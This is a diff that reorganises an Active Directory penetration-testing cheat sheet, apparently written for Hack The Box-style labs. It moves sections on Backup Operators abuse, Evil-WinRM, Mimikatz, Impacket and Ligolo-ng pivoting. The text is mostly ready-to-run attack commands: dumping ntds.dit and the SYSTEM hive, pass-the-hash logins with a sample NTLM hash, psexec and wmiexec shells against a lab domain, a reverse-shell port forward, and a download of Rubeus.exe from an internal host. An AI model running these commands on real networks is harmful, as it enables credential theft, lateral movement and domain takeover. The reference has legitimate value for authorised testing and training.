@@ -23,6 +23,7 @@ keywords: Internals
   - [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
   - [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
   - [Spray](https://github.com/Greenwolf/Spray)
+  - [Hashcat Wordlists - InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/#hashcat-install)
 
 ## Rid Brute via SMB
 **[Rid Brute via SMB](https://medium.com/@e.escalante.jr/active-directory-workshop-brute-forcing-the-domain-server-using-crackmapexec-pt-6-feab1c43d970)**
@@ -198,10 +199,6 @@ In this case we can still abuse a feature of kerberos called "alternative servic
 **Additional Resources**
   - [Using altservice to generate LDAP TGS](https://medium.com/r3d-buck3t/attacking-kerberos-constrained-delegations-4a0eddc5bb13#3276)
 
------------------------------------------------------------------------
-
-# Lateral Movement
-
 ## ForceChangePassword
 **[ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)**
 
@@ -249,88 +246,51 @@ pypykatz lsa minidump lsass.DMP
 ```
 
 ## Abusing Backup Operators Group
+
+**Requires:** User account that is member of the Backup Operators group
+**Achieves:** Extract ntds.dit, dump hashes to escalate privileges to Domain Admin
+
 **[Backup Operator - Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators)**
+
 ```
 whoami /all (SeBackupPrivilege Enabled)
 
 diskshadow /s backup.txt
 robocopy /b E:\Windows\ntds . ntds.dit (NTDS file)
 reg save hklm\system c:\temp\system.bak (System Hive keys)
-
-## Other Resources
-https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#ac58
 ```
+**Additional Resources**
+  -  [Windows Privilege Escalation with SeBackupPrivilege](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#ac58)
+
 
 -----------------------------------------------------------------------
 
-# Active Directory Tools
-**[NetExec](https://github.com/Pennyw0rth/NetExec)**
-```
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh (install Rust)
-source $HOME/.cargo/env
-pipx install git+https://github.com/Pennyw0rth/NetExec
-```
+# Lateral Movement
 
-**[PowerView (Deprecated since 2021)](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)**
-```
-. .\powerview.ps1
-Import-Module C:\Temp\PowerView.ps1
-```
-
-**NSE**
-```--script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-vuln*```
-
-**SMB**
-Enum4Linux
-SMBMap
-smbclient
-smbclient.py (Impacket)
-**[NetExec - Cheatsheet](https://github.com/BlWasp/NetExec-Cheatsheet)**
-**[SMB Enumeration Cheatsheet](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)**
-
-**WinRM**
-**[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)**
-```
-evil-winrm -i 10.10.10.192 -u "svc_backup" -H "9658d1d1dcd9250115e2205d9f48400d"
-```
-
-**[Impacket]()**
-```
-python3 -m pipx install impacket
-  - **PSExec**
-    - Shell access via SMB shares (Pass the Hash) 
-  - **GetNPUsers**
-    - Kerberos Pre-authentication disabled (ASREPRoasting)
-
-smbclient.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb -debug
-wmiexec.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb
-psexec.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb
-```
-
-**[Network Pivoting - Ligolo-ng](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740)**
+## WinRM 
+**[Evil-WinRM - ultimate WinRM shell for hacking/pentesting](https://github.com/Hackplayers/evil-winrm)**
 
 ```
-./agent -connect 10.10.14.5:443 -ignore-cert
-sudo ./proxy -selfcert -laddr 0.0.0.0:443 -v
-session
-start
-sudo ip route add 192.168.110.0/24 dev ligolo
+gem install evil-winrm
+evil-winrm -i <IP> -u <username> -p <password>
+evil-winrm -i <IP> -u <username> -H <ntlm hash>
+evil-winrm -i <IP> -u <username> -k
 
-listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444 (open port on DMZ machine for reverse shell)
+## Run Powershell Commands
+whoami
+ipconfig
+Get-Process
 
-powershell -Command "Invoke-WebRequest -Uri 'http://192.168.110.51:1235/Rubeus.exe' -OutFile 'Rubeus.exe'"
+## Upload and Download Files
+upload /local/path/to/file /remote/path
+download /remote/path/to/file /local/path
+
+## Run Powershell Scripts
+upload /local/path/to/script.ps1 /remote/path/script.ps1
+powershell -File /remote/path/script.ps1
 ```
-**Additional Resources**
-  - [Ligolo Guide for pivoting](https://systemweakness.com/pivoting-for-newbies-with-ligolo-ng-82f13040aa39)
-  - [Advanced pivoting guide](https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5)
 
-**[Rubeus for Windows](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)**
-
-**[Pywerview - Linux AD Enumeration](https://github.com/the-useless-one/pywerview)**
-
-**[Empire - Post-exploitation Framework](https://github.com/BC-SECURITY/Empire)**
-
-
+## Mimikatz
 **[Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)**
 
 ```
@@ -392,8 +352,71 @@ mimikatz vault::list
   - [Mimikatz Post Exploitation Basics](https://infosecwriteups.com/post-exploitation-basics-in-active-directory-enviorment-by-hashar-mujahid-d46880974f87)
   - [Mimikatz Guide Reference](https://adsecurity.org/?page_id=1821)
 
+## Network Pivoting via Ligolo-ng
+**[Network Pivoting - Ligolo-ng](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740)**
 
-**[Wordlists](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/#hashcat-install)**
+```
+./agent -connect 10.10.14.5:443 -ignore-cert
+sudo ./proxy -selfcert -laddr 0.0.0.0:443 -v
+session
+start
+sudo ip route add 192.168.110.0/24 dev ligolo
+
+listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444 (open port on DMZ machine for reverse shell)
+
+powershell -Command "Invoke-WebRequest -Uri 'http://192.168.110.51:1235/Rubeus.exe' -OutFile 'Rubeus.exe'"
+```
+
+**Additional Resources**
+  - [Ligolo Guide for pivoting](https://systemweakness.com/pivoting-for-newbies-with-ligolo-ng-82f13040aa39)
+  - [Advanced pivoting guide](https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5)
+
+-----------------------------------------------------------------------
+
+# Active Directory Tools
+**[NetExec](https://github.com/Pennyw0rth/NetExec)**
+```
+curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh (install Rust)
+source $HOME/.cargo/env
+pipx install git+https://github.com/Pennyw0rth/NetExec
+```
+
+**[PowerView (Deprecated since 2021)](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)**
+```
+. .\powerview.ps1
+Import-Module C:\Temp\PowerView.ps1
+```
+
+**NSE**
+```--script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-vuln*```
+
+**SMB**
+Enum4Linux
+SMBMap
+smbclient
+smbclient.py (Impacket)
+**[NetExec - Cheatsheet](https://github.com/BlWasp/NetExec-Cheatsheet)**
+**[SMB Enumeration Cheatsheet](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)**
+
+**[Impacket]()**
+```
+python3 -m pipx install impacket
+  - **PSExec**
+    - Shell access via SMB shares (Pass the Hash) 
+  - **GetNPUsers**
+    - Kerberos Pre-authentication disabled (ASREPRoasting)
+
+smbclient.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb -debug
+wmiexec.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb
+psexec.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb
+```
+
+**[Rubeus for Windows](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)**
+
+**[Pywerview - Linux AD Enumeration](https://github.com/the-useless-one/pywerview)**
+
+**[Empire - Post-exploitation Framework](https://github.com/BC-SECURITY/Empire)**
+
 
 ## Resources
  - [The Hacker Recipes](https://www.thehacker.recipes/)
